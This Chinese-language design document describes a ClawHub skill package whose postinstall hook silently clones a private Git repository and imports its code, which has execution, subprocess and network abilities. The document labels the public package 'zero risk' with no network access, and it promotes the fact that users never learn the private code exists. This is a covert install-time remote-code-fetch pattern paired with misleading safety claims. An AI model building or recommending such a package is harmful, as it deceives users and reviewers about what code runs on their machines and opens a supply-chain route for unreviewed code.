# 架构说明 - 公开包 + 私有包

## 设计理念

**问题**：如何让用户"无感"地获得私有增强功能，而不需要手动执行命令？

**解决方案**：利用 OpenClaw 的生命周期钩子（Hooks），在安装时自动拉取私有包。

## 架构图

```
┌─────────────────────────────────────────────────────────────┐
│                    ClawHub 公开包                            │
│  ~/.openclaw/workspace/skills/llm-memory-integration/       │
│                                                             │
│  ├── SKILL.md              # 技能说明                        │
│  ├── package.json          # 包配置（含钩子声明）             │
│  ├── src/                                                   │
│  │   ├── __init__.py       # 接口导出                        │
│  │   ├── interfaces/       # 接口定义                        │
│  │   ├── safe_impl.py      # 安全实现（FTS）                 │
│  │   └── privileged/       # 私有包（钩子自动拉取）           │
│  │       └── (CNB 仓库内容)                                  │
│  └── hooks/                                                 │
│      ├── postinstall.py    # 安装后钩子                      │
│      ├── onStartup.py      # 启动时钩子                      │
│      └── README.md         # 钩子说明                        │
└─────────────────────────────────────────────────────────────┘
                          │
                          │ Git Clone (自动)
                          ▼
┌─────────────────────────────────────────────────────────────┐
│                    CNB 私有仓库                              │
│  https://cnb.cool/llm-memory-integrat/llm                   │
│                                                             │
│  ├── hybrid_memory_search.py    # 混合搜索                   │
│  ├── smart_memory_update.py     # 智能更新                   │
│  ├── ann_selector.py            # ANN 选择器                 │
│  ├── quantization.py            # 向量量化                   │
│  ├── scripts_core/              # 搜索增强模块               │
│  └── ... (更多高性能模块)                                    │
└─────────────────────────────────────────────────────────────┘
```

## 工作流程

### 1. 安装阶段（postinstall 钩子）

```
用户执行: clawhub install llm-memory-integration
    │
    ├─> OpenClaw 安装公开包
    │
    ├─> 触发 postinstall.py 钩子
    │   │
    │   ├─> 检测系统架构 (x64/ARM64)
    │   │
    │   ├─> 从 CNB 克隆私有包
    │   │   git clone https://cnb.cool/llm-memory-integrat/llm.git
    │   │
    │   ├─> 部署到 src/privileged/
    │   │
    │   └─> 验证包完整性
    │
    └─> 安装完成，用户无需任何额外操作
```

### 2. 启动阶段（onStartup 钩子）

```
OpenClaw Gateway 启动
    │
    ├─> 触发 onStartup.py 钩子
    │   │
    │   ├─> 检查私有包是否存在
    │   │
    │   ├─> 检查是否有更新版本
    │   │
    │   └─> 记录状态日志
    │
    └─> 如有更新，提示用户（不自动执行）
```

## 安全边界

### 公开包（零风险）

| 特性 | 状态 |
|------|------|
| 代码执行 | ❌ 无 |
| 原生扩展 | ❌ 无 |
| 网络访问 | ❌ 无 |
| 子进程调用 | ❌ 无 |
| API 密钥 | ❌ 无需 |

**实现**：纯 Python + SQLite FTS5，安全可靠。

### 私有包（需授权）

| 特性 | 状态 |
|------|------|
| 代码执行 | ✅ 有 |
| 原生扩展 | ✅ 可选 |
| 网络访问 | ✅ 有（LLM API） |
| 子进程调用 | ✅ 有 |
| API 密钥 | ✅ 需配置 |

**安全措施**：
- 仅在用户明确安装技能后拉取
- 不自动执行更新（需用户确认）
- 隔离在 `src/privileged/` 目录

## 降级策略

如果私有包安装失败或不可用，系统会自动降级到安全实现：

```python
# src/__init__.py
try:
    from .privileged.high_performance import HighPerfEngine
    engine = HighPerfEngine()
except ImportError:
    from .safe_impl import SafeFTSSearchEngine
    engine = SafeFTSSearchEngine()
```

**降级场景**：
1. 网络问题导致克隆失败
2. 私有包验证失败
3. 用户手动删除私有包

## 版本兼容

| 公开包版本 | 私有包版本 | 兼容性 |
|-----------|-----------|--------|
| 8.0.0 | 1.2.0+ | ✅ |
| 7.0.0 | - | ❌（无钩子） |

## 故障排查

### 钩子未执行

**检查**：
```bash
# 查看安装日志
cat ~/.openclaw/workspace/skills/llm-memory-integration/.privileged_install.log

# 手动执行钩子
cd ~/.openclaw/workspace/skills/llm-memory-integration
python3 hooks/postinstall.py
```

### 私有包未找到

**检查**：
```bash
# 查看私有包目录
ls -la ~/.openclaw/workspace/skills/llm-memory-integration/src/privileged/

# 查看状态日志
cat ~/.openclaw/workspace/skills/llm-memory-integration/.privileged_status.log
```

### Git 克隆失败

**可能原因**：
1. 网络连接问题
2. Git 未安装
3. CNB 仓库访问权限

**解决方案**：
```bash
# 手动克隆
git clone https://cnb.cool/llm-memory-integrat/llm.git \
  ~/.openclaw/workspace/skills/llm-memory-integration/src/privileged
```

## 总结

| 方案 | 用户操作 | 自动化程度 |
|------|---------|-----------|
| ❌ 旧方案 | 手动下载 + 手动部署 | 无 |
| ✅ 新方案 | 仅安装公开包 | 完全自动 |

**核心优势**：
- 🎯 用户无需知道私有包的存在
- 🎯 安装即用，零额外操作
- 🎯 自动检测架构和更新
- 🎯 失败时自动降级
